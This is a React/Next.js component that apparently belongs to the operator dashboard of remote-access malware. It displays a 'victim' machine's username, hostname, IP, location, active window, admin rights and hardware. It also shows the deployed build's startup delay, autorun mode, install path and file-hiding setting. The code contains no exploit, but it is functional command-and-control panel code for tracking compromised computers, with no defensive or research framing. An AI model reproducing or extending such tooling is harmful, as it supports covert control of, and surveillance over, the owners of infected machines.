"use client";

import Image from "next/image";
import { useEffect, useRef } from "react";
import { useQueryClient } from "@tanstack/react-query";

import type { Victim } from "../../../api/victims";
import { formatTime, getLastActiveMs } from "../../utils/victim-status";
import { countryCodeToName } from "../../utils/country-names";
import { formatRam } from "../../utils/format-ram";

function Row(props: { label: string; value: string }) {
   const { label, value } = props;
   return (
      <>
         <div className="border-b-[2px] border-b-[var(--line)] py-[5px] text-[17px] font-[550] text-white/95 break-all">{label}</div>
         <div className="border-b-[2px] border-b-[var(--line)] py-[5px] text-[17px] font-[450] text-white/95 break-all">{value}</div>
      </>
   );
}

function getExtra(victim: Victim | null, key: string): string {
   if (!victim) return "";
   const v = (victim as Record<string, unknown>)[key];
   if (v == null) return "";
   return String(v);
}

function fmtLastActive(victim: Victim | null): string {
   if (!victim) return "";
   const ms = getLastActiveMs(victim);
   return ms ? formatTime(ms) : "";
}

export function InformationSection(props: { victim: Victim | null }) {
   const { victim } = props;

   const qc = useQueryClient();
   const loadingRef = useRef(false);

   useEffect(() => {
      const btn = document.getElementById("pcInfoReload") as HTMLButtonElement | null;
      if (!btn) return;

      const onClick = async () => {
         if (loadingRef.current) return;
         loadingRef.current = true;
         const start = Date.now();
         try {
            await qc.invalidateQueries({ queryKey: ["victims"] });
         } catch {
         }

         const elapsed = Date.now() - start;
         const delay = elapsed >= 2000 ? 0 : 2000 - elapsed;
         window.setTimeout(() => {
            window.setTimeout(() => {
               loadingRef.current = false;
            }, 2000);
         }, delay);
      };

      btn.addEventListener("click", onClick);
      return () => {
         btn.removeEventListener("click", onClick);
      };
   }, [qc]);

   return (
      <div className="detail-section" data-section="information">
         <div
            className={
               "detail-card w-[680px] max-w-[min(940px,calc(100vw-260px))] min-h-[640px] rounded-[18px] border border-[rgba(130,130,130,0.75)] " +
               "bg-[rgba(18,18,18,0.66)] p-[16px_18px_18px] shadow-[0_0_0_1px_rgba(0,0,0,0.7),0_20px_46px_rgba(0,0,0,0.85)] backdrop-blur-[14px] " +
               "transition-[transform,box-shadow,border-color] duration-[140ms] " +
               "hover:border-[rgba(200,200,200,0.95)] hover:shadow-[0_0_0_1px_rgba(0,0,0,0.85),0_22px_52px_rgba(0,0,0,0.9)]"
            }
         >
            <header className="detail-header flex items-center justify-between">
               <h2 className="m-0 text-[18px] font-[650] text-white">PC info</h2>
               <button
                  id="pcInfoReload"
                  className="refresh-btn border-none bg-transparent cursor-pointer"
                  type="button"
                  aria-label="Reload PC info"
               >
                  <Image src="/icons/reload.svg" alt="reload" width={20} height={20} draggable={false} className="invert-[0.9]" />
               </button>
            </header>

            <div className="detail-separator h-[2px] w-full bg-[var(--line)]" style={{ margin: "8px 0 10px" }} />

            <div className="pc-info-content grid grid-cols-[max-content_1fr] gap-x-[18px] gap-y-0 text-[17px]">
               <Row label="Username:" value={victim?.user ?? ""} />
               <Row label="PC-name:" value={victim?.hostname ?? ""} />
               <Row label="Ip:" value={victim?.ip ?? ""} />
               <Row label="Location:" value={countryCodeToName(victim?.country)} />
               <Row label="Active window:" value={victim?.window ?? ""} />
               <Row label="System:" value={victim?.os ?? ""} />
               <Row label="Last active:" value={fmtLastActive(victim)} />
               <Row label="Admin rights:" value={victim?.admin ? "True" : "False"} />
               <Row label="CPU:" value={victim?.cpu ?? ""} />
               <Row label="GPU:" value={victim?.gpu ?? ""} />
               <Row label="Ram:" value={formatRam(victim?.ram)} />
               <Row label="Comment:" value={victim?.comment ?? ""} />
            </div>

            <header className="detail-header mt-[18px] flex items-center justify-between">
               <h2 className="m-0 text-[18px] font-[650] text-white">Build info</h2>
            </header>

            <div className="detail-separator h-[2px] w-full bg-[var(--line)]" style={{ margin: "8px 0 10px" }} />

            <div className="build-info-content grid grid-cols-[max-content_1fr] gap-x-[18px] gap-y-0 text-[17px]">
               <Row label="Build version:" value={getExtra(victim, "version")} />
               <Row label="Startup delay (sec):" value={victim?.startupDelaySeconds != null ? String(victim.startupDelaySeconds) : ""} />
               <Row label="Autorun:" value={getExtra(victim, "autorunMode")} />
               <Row label="Install:" value={(() => {
                  const path = getExtra(victim, "installPath");
                  if (!path) return "Random";
                  return path;
               })()} />
               <Row label="Hide files:" value={victim?.hideFilesEnabled ? "True" : "False"} />
            </div>
         </div>
      </div>
   );
}